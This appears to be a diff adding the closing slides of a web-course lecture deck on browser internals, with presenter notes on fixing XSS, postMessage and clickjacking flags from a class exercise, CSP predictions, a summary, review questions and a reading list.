+  <p class="kicker">Second half of the exercise · 9 minutes, then debrief</p>
+  <div class="ex-head"><h2>One change per flag</h2></div>
+  <ol>
+    <li>For each flag you captured: make the <strong>one change</strong> that closes it, and re-run your exploit to prove it.</li>
+    <li>Predict, with the code left vulnerable: which flags would a CSP in a <code>&lt;meta&gt;</code> tag stop? Which would a CSP header stop?</li>
+    <li>Be ready to defend the prediction: we test it together at the end.</li>
+  </ol>
+  <aside class="notes">
+    <p>2:38 → 2:47 fixing, 2:47 → 2:55 debrief. Prediction key: <code>&lt;meta&gt;</code> CSP stops 1, 2 and 3 (3 through 1 or 2); a header CSP stops those plus 5 (<code>frame-ancestors</code>). Flag 4 is the nuanced one: a header with <code>frame-ancestors</code> on the widget blocks the iframe route, but an attacker page that opens the widget with <code>window.open</code> still reaches it — the real fix is the <code>origin</code> check. Accept "header stops 4" if the student names that limit. Fixes, for the debrief, not for the slide:</p>
+    <p>1 · <code>textContent</code>, or <code>DOMPurify.sanitize</code> on output — CSP stops it (no inline handlers). 2 · never put the fragment in a sink; render it as text — CSP stops it. 3 · session in an <code>HttpOnly</code> cookie, no token in <code>localStorage</code> — CSP stops it only because it depends on flag 1 or 2. 4 · <code>if (e.origin !== …) return;</code> — CSP doesn't help. 5 · <code>frame-ancestors 'none'</code> as a <strong>header</strong> — a <code>&lt;meta&gt;</code> CSP can't set it.</p>
+    <p>The CSP experiment is the point of the exercise, so run it yourself at the debrief: on the unfixed site, add the <code>&lt;meta&gt;</code> CSP and re-run two or three payloads you collected in the chat during part 1 (stored payloads live in each student's own database). A policy stops the payloads they wrote twenty minutes earlier without a change to the vulnerable code, and flags 4 and 5 are untouched by a <code>&lt;meta&gt;</code> policy. Why that is not a reason to skip the fix: defence in depth, and a policy can be weakened by the next person who needs an inline script. A working policy for the experiment: <code>script-src 'self'; object-src 'none'; base-uri 'none'</code> — which only works if the recipe site itself has no inline scripts or handlers; build it that way.</p>
+  </aside>
+</section>
+
+<!-- =====================================================================
+     CLOSE
+     ===================================================================== -->
+
+<section data-act="F" data-act-name="Close" data-at="2:55" data-title="Today in one slide">
+  <p class="kicker">Today, in one slide</p>
+  <h2>Inside the browser</h2>
+  <div class="grid-3 cards3">
+    <div class="card"><span class="label">processes</span><p>Browser process, renderers never shared between sites, GPU, utilities. A renderer is sandboxed and asks over IPC.</p></div>
+    <div class="card"><span class="label">threads</span><p>Main thread: parse, style, layout, paint, your JavaScript. Compositor: scrolling and <code>transform</code> / <code>opacity</code>.</p></div>
+    <div class="card"><span class="label">loading</span><p>HTML streams and parses incrementally. Classic scripts block it, <code>defer</code> doesn't, CSS blocks the first paint. LCP, INP and CLS measure what the user feels.</p></div>
+    <div class="card"><span class="label">rendering</span><p>The layout tree is not the DOM. Stacking contexts make <code>z-index</code> local. Layers move without repainting.</p></div>
+    <div class="card"><span class="label">origins</span><p>Same-origin policy is the boundary. An XSS runs <em>as you</em>, so the SOP doesn't help.</p></div>
+    <div class="card"><span class="label">defences</span><p>Don't parse untrusted data. CSP, Trusted Types, cookie attributes, <code>frame-ancestors</code>, <code>origin</code> checks.</p></div>
+  </div>
+  <aside class="notes">
+    <p>~2:55. One sentence per card, then move on. If the clock is tight, skip straight to the three questions.</p>
+  </aside>
+</section>
+
+<section data-title="Three questions">
+  <p class="kicker">For any page, yours or someone else's</p>
+  <h2>Three questions that fit on a sticky note</h2>
+  <ol>
+    <li>Which <strong>stage</strong> is the user waiting on — parse, style, layout, paint or composite?</li>
+    <li>Which <strong>thread</strong> runs it, and what else is queued on that thread?</li>
+    <li>Whose <strong>code</strong> runs on this origin, and what can it read?</li>
+  </ol>
+  <p class="muted">Optional: open a page you built earlier in this course with the Rendering tab on and an enforcing <code>&lt;meta&gt;</code> CSP added to a local copy, and list what the console and the overlays flag.</p>
+  <aside class="notes">
+    <p>~2:56. The optional task is deliberately on their own old code: everyone finds something, usually an inline handler or an image without dimensions. CSP won't flag a CDN script without <code>integrity</code>; that one they check by hand.</p>
+  </aside>
+</section>
+
+<section data-title="Reading">
+  <p class="kicker">Reading</p>
+  <h2>To go deeper</h2>
+  <ul class="reading">
+    <li><a href="https://developer.chrome.com/blog/inside-browser-part1" target="_blank" rel="noopener">Inside look at modern web browser</a> <span class="muted">— the four-part series on processes, navigation, the renderer and the compositor</span></li>
+    <li><a href="https://developer.mozilla.org/en-US/docs/Web/Performance/Guides/How_browsers_work" target="_blank" rel="noopener">MDN · How browsers work</a> <span class="muted">— the pipeline, stage by stage</span></li>
+    <li><a href="https://web.dev/articles/vitals" target="_blank" rel="noopener">web.dev · Web Vitals</a> <span class="muted">— LCP, INP, CLS: definitions and what moves them</span></li>
+    <li><a href="https://developer.chrome.com/docs/devtools/rendering" target="_blank" rel="noopener">DevTools · the Rendering tab</a> <span class="muted">— every switch we used</span></li>
+    <li><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_positioned_layout/Stacking_context" target="_blank" rel="noopener">MDN · Stacking context</a> <span class="muted">— the full list of what creates one</span></li>
+    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP · XSS Prevention Cheat Sheet</a> <span class="muted">— escaping per context, with examples</span></li>
+    <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP" target="_blank" rel="noopener">MDN · Content Security Policy</a> <span class="muted">— every directive, nonces, report-only</span></li>
+    <li><a href="https://web.dev/articles/trusted-types" target="_blank" rel="noopener">web.dev · Trusted Types</a> <span class="muted">— how to roll it out on an existing site</span></li>
+    <li><a href="https://portswigger.net/web-security" target="_blank" rel="noopener">PortSwigger Web Security Academy</a> <span class="muted">— free labs: XSS, CSRF, clickjacking, CORS</span></li>
+  </ul>
+  <aside class="notes">
+    <p>~2:58. The PortSwigger labs are the right homework for anyone who liked the CTF: hundreds of them, free, each one a single vulnerability with a hint ladder. The Chrome series is the one to read if only one gets read.</p>
+  </aside>
+</section>
+
+<section class="no-chrome" data-title="Inside the browser. Thanks.">
+  <div class="title-grid">
+    <div>
+      <p class="kicker">Thank you</p>
+      <h1 class="big-title">Inside the <span class="b">browser.</span></h1>
+      <p class="title-sub">materials →<br><a href="https://lopin.me/harbour/programming-interactivity-12-inside-the-browser/" target="_blank" rel="noopener">lopin.me/harbour/programming-interactivity-12-inside-the-browser</a></p>
+    </div>
+    <div class="title-art" aria-hidden="true">
+<pre class="raw sm"><span class="c">// the three questions</span>
+which stage is the user waiting on?
+which thread runs it?
+whose code runs on this origin?</pre>
+    </div>
+  </div>
+</section>
+
+</main>
+<script src="assets/kit.js"></script>
+<script src="assets/deck.js"></script>
+</body>
+</html>
